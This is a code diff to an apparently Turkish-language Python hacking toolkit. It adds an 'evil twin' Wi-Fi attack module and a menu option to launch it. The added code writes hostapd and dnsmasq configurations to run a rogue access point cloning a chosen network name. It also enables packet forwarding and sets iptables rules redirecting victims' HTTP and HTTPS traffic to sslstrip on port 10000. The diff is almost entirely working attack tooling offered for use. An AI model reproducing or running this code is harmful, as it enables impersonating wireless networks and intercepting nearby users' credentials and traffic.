@@ -17,7 +17,11 @@ from PyQt5.QtCore import *
 from PyQt5.QtGui import *
 from PyQt5.QtWebEngineWidgets import *
 from PyQt5.QtPrintSupport import *
+import subprocess
 import instaloader
+import shutil
+import time
+from argparse import ArgumentParser
 # Consol's colors
 W = '\033[0m'
 R = '\033[31m'
@@ -28,7 +32,6 @@ P = '\033[35m'
 C = '\033[36m'
 GR = '\033[37m'
 x = "Ayarlanmadı"
-
 
 def dondurme_linux():
     for i in range(0, random.randint(1, 3)):
@@ -386,8 +389,260 @@ def dondurme_windows():
         system("cls")
         print(G + "People see what they see. I'll show you what you don't want to seE ...")
         sleep(0.1)
+HOSTAPD_CONF = '/etc/hostapd/hostapd.conf'
+HOSTAPD_DEFAULT_DRIVER = 'nl80211'
+HOSTAPD_DEFAULT_HW_MODE = 'g'
+
+DNSMASQ_CONF = '/etc/dnsmasq.conf'
 
 
+DNSMASQ_LOG = '/var/log/dnsmasq.log'
+# Network Configs
+upstream = None
+phys = None
+ssid = None
+channel = None
+
+
+def bash_command(command):
+    command = command.split()
+    p = subprocess.Popen(command, stdout=subprocess.PIPE)
+    output, err = p.communicate()
+
+
+def enable_packet_forwarding():
+    with open('/proc/sys/net/ipv4/ip_forward', 'w') as fd:
+        fd.write('1')
+
+
+def disable_packet_forwarding():
+    with open('/proc/sys/net/ipv4/ip_forward', 'w') as fd:
+        fd.write('0')
+
+
+class IPTables(object):
+    _instance = None
+
+    def __init__(self):
+        self.running = False
+        self.reset()
+
+    @staticmethod
+    def get_instance():
+        if IPTables._instance is None:
+            IPTables._instance = IPTables()
+        return IPTables._instance
+
+    def route_to_sslstrip(self, phys, upstream):
+        bash_command('iptables --table nat --append POSTROUTING --out-interface %s -j MASQUERADE' % phys)
+
+        bash_command('iptables --append FORWARD --in-interface %s -j ACCEPT' % upstream)
+
+        bash_command('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000')
+        bash_command('iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 10000')
+
+        bash_command('iptables -t nat -A POSTROUTING -j MASQUERADE')
+
+    def reset(self):
+        bash_command('iptables -P INPUT ACCEPT')
+        bash_command('iptables -P FORWARD ACCEPT')
+        bash_command('iptables -P OUTPUT ACCEPT')
+
+        bash_command('iptables --flush')
+        bash_command('iptables --flush -t nat')
+
+
+class HostAPD(object):
+    _instance = None
+
+    def __init__(self):
+
+        self.running = False
+        self.conf = HOSTAPD_CONF
+
+    @staticmethod
+    def get_instance():
+
+        if HostAPD._instance is None:
+            HostAPD._instance = HostAPD()
+        return HostAPD._instance
+
+    def start(self):
+
+        if self.running:
+            raise Exception('[Utils] hostapd is already running.')
+
+        self.running = True
+        bash_command('hostapd %s' % self.conf)
+        time.sleep(2)
+
+    def stop(self):
+
+        if not self.running:
+            raise Exception('[Utils] hostapd is not running.')
+
+        bash_command('killall hostapd')
+        time.sleep(2)
+
+    def configure(self,
+                  upstream,
+                  ssid,
+                  channel,
+                  driver=HOSTAPD_DEFAULT_DRIVER,
+                  hw_mode=HOSTAPD_DEFAULT_HW_MODE):
+
+        # make backup of existing configuration file
+        shutil.copy(self.conf, '%s.evil_twin.bak' % self.conf)
+
+        with open(self.conf, 'w') as fd:
+            fd.write('\n'.join([
+                'interface=%s' % upstream,
+                'driver=%s' % driver,
+                'ssid=%s' % ssid,
+                'channel=%d' % channel,
+                'hw_mode=%s' % hw_mode,
+            ]))
+
+    def restore(self):
+
+        shutil.copy('%s.evil_twin.bak' % self.conf, self.conf)
+
+
+class DNSMasq(object):
+    _instance = None
+
+    def __init__(self):
+
+        self.running = False
+        self.conf = DNSMASQ_CONF
+
+    @staticmethod
+    def get_instance():
+
+        if DNSMasq._instance is None:
+            DNSMasq._instance = DNSMasq()
+        return DNSMasq._instance
+
+    def start(self):
+
+        if self.running:
+            raise Exception('[Utils] dnsmasq is already running.')
+
+        self.running = True
+        bash_command('service dnsmasq start')
+        time.sleep(2)
+
+    def stop(self):
+
+        if not self.running:
+            raise Exception('[Utils] dnsmasq is not running.')
+
+        bash_command('killall dnsmasq')
+        time.sleep(2)
+
+    def configure(self,
+                  upstream,
+                  dhcp_range,
+                  dhcp_options=[],
+                  log_facility=DNSMASQ_LOG,
+                  log_queries=True):
+
+        # make backup of existing configuration file
+        shutil.copy(self.conf, '%s.evil_twin.bak' % self.conf)
+
+        with open(self.conf, 'w') as fd:
+            fd.write('\n'.join([
+                'log-facility=%s' % log_facility,
+                'interface=%s' % upstream,
+                'dhcp-range=%s' % dhcp_range,
+                '\n'.join('dhcp-option=%s' % o for o in dhcp_options),
+            ]))
+            if log_queries:
+                fd.write('\nlog-queries')
+
+    def restore(self):
+
+        shutil.copy('%s.evil_twin.bak' % self.conf, self.conf)
+def send_data():
+    upstream = str(input("upstream:"))
+    phys = str(input("phys:"))
+    ssid = str(input("ssid:"))
+    channel = int(input("channel:"))
+    return upstream,phys,ssid,channel
+def display_configs(configs):
+    print('[+] Access Point interface:', configs['upstream'])
+    print('[+] Network interface:', configs['phys'])
+    print('[+] Target AP Name:', configs['ssid'])
+    print('[+] Target AP Channel:', configs['channel'])
+def kill_daemons():
+    print('[*] Killing existing dnsmasq and hostapd processes.')
+
+    bash_command('killall dnsmasq')
+    bash_command('killall hostapd')
+    print('[*] Continuing...')
+def main():
+    configs = send_data()
+    display_configs(configs)
+    kill_daemons()
+
+    hostapd = HostAPD.get_instance()
+    iptables = IPTables.get_instance()
+    dnsmasq = DNSMasq.get_instance()
+
+    # bring up ap interface
+    bash_command('ifconfig %s down' % configs['upstream'])
+    bash_command('ifconfig %s 10.0.0.1/24 up' % configs['upstream'])
+
+    # configure dnsmasq
+    print('[*] Configuring dnsmasq')
+    dnsmasq.configure(configs['upstream'],
+                      '10.0.0.10,10.0.0.250,12h',
+                      dhcp_options=['3,10.0.0.1', '6,10.0.0.1'])
+    # configure hostpad
+    print(
+    '[*] Configuring hostapd')
+    hostapd.configure(configs['upstream'],
+                      configs['ssid'],
+                      configs['channel'])
+    # enable packet forwarding
+    print(
+    '[*] Enabling packet forwarding.')
+    enable_packet_forwarding()
+
+    print(
+    '[*] Configuring iptables to route packets to sslstrip')
+    iptables.route_to_sslstrip(configs['phys'], configs['upstream'])
+
+    try:
+
+        # launch access point
+        print(
+        '[*] Starting dnsmasq.')
+        dnsmasq.start()
+        print(
+        '[*] Starting hostapd.')
+        hostapd.start()
+
+    except KeyboardInterrupt:
+
+        print(
+        '\n\n[*] Exiting on user command.')
+
+        # restore everything
+    print(
+    '[*] Stopping dnsmasq.')
+    dnsmasq.stop()
+    print(
+    '[*] Stopping hostapd.')
+    hostapd.stop()
+
+    print(
+    '[*] Restoring iptables.')
+    iptables.reset()
+
+    print(
+    '[*] Disabling packet forwarding.')
+    disable_packet_forwarding()
 def internet_connection_control():
     try:
         x = "internet"
@@ -848,6 +1103,7 @@ def wifi_tools():
     3-Wifi taramasi baslat
     4-Handshake yakala
     5-airgeddon
+    6-Launch the evil twin attack
     """)
     aBJDj = int(input("Secim:"))
     if aBJDj == 1:
@@ -860,6 +1116,9 @@ def wifi_tools():
         handshake_take()
     elif aBJDj == 5:
         airgeddon()
+    elif aBJDj == 6:
+        if __name__ == '__main__':
+            main()
     else:
         print("\033[93;1m[!]\033 Bir hata olustu")
 
@@ -893,6 +1152,7 @@ def hidden_panel(inputt):
                 sleep(0.015)
                 os.system("clear")
                 print("{} being encrypted / ".format(password23))
+            print(encryption(password=password23))
         elif os.name == "nt":
             for i in range(1, len(password23 * 15)):
                 sleep(0.015)
@@ -943,6 +1203,10 @@ def dosya_acma(write):
     file.write(write)
     file.close()
 
+def bash_command(command):
+    command = command.split()
+    p = subprocess.Popen(command, stdout=subprocess.PIPE)
+    output, err = p.communicate()
 
 def sistem_ara():
     if os.name == "posix":
